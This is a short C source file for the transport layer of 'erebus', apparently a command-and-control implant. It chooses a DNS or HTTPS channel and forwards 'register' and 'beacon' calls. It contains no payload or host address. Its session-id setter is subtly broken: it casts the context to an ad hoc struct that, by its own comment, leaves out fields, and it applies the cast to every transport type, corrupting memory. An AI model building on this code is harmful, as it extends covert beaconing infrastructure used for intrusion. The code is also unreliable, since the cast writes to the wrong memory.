#include <stdlib.h>
#include <string.h>

#include "erebus/config.h"
#include "erebus/transport.h"

int erebus_transport_create(const char *type, erebus_transport **out) {
    if (!type || !type[0]) type = EREBUS_TRANSPORT_TYPE;
    if (!type[0]) type = "https";
    if (strcmp(type, "dns") == 0)
        return erebus_transport_create_dns(out);
    return erebus_transport_create_https(out);
}

void erebus_transport_destroy(erebus_transport *t) {
    if (t && t->ops && t->ops->destroy)
        t->ops->destroy(t);
}

int erebus_transport_register(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    if (!t || !t->ops || !t->ops->register_call) return 0;
    return t->ops->register_call(t, req, req_len, resp, resp_len);
}

int erebus_transport_beacon(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    if (!t || !t->ops || !t->ops->beacon_call) return 0;
    return t->ops->beacon_call(t, req, req_len, resp, resp_len);
}

void erebus_transport_set_session_id(erebus_transport *t, const char *session_id) {
    if (!t || !t->ctx || !session_id) return;
    /* dns_ctx layout: session_id at offset after domain+server+sock+addr - use struct field via cast */
    typedef struct { char domain[256]; char server[64]; char session_id[64]; } dns_layout;
    dns_layout *d = (dns_layout *)t->ctx;
    strncpy(d->session_id, session_id, sizeof(d->session_id) - 1);
}